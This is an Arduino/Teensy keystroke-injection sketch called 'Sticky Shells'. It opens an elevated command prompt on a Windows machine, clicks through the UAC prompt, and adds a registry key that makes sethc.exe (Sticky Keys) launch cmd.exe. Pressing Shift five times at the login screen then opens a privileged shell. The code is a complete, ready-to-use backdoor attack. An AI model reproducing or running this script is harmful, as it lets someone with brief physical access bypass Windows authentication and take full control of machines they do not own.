/*

Sticky Shells - Replace stickey keys with cmd.exe
(Run, then press SHIFT 5 times at logon)

Tested on Windows 7, should work on 2k8. Will not work on XP as is.

*/

#include <PS2Keyboard.h>

void setup() {
  Serial.begin(9600);
  delay(1000); // wait for host to see HID 
}

void loop() {
  
  // press Windows key
    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.send_now();
    delay(1500); // wait for menu
    
  // type "cmd"
    Keyboard.print("cmd");
    
  // press ctrl-shift-enter to run as admin
    Keyboard.set_modifier(MODIFIERKEY_CTRL);
    Keyboard.send_now();
    Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
    Keyboard.send_now();
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(1500); // wait for UAC warning
    
  // key over to accept UAC warning
    Keyboard.set_key1(KEY_LEFT);
    Keyboard.send_now();
    Keyboard.set_key1(0);
    Keyboard.send_now();
    
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(1000); // wait for command window
    
  // type command to replace stickey keys - taken from http://www.redmondpie.com/windows-7-exploit-allows-any-program-to-run-on-login-screen/
    Keyboard.print("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\ \" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\"");
    
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    Keyboard.set_key1(0);
    Keyboard.send_now();
    
    delay(2000); // wait for operation to complete
    
  // close prompt
    Keyboard.print("exit");
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    Keyboard.set_key1(0);
    Keyboard.send_now();
    
    delay(1000000); // wait a really long time before looping again - unplug teensy now!
    
}
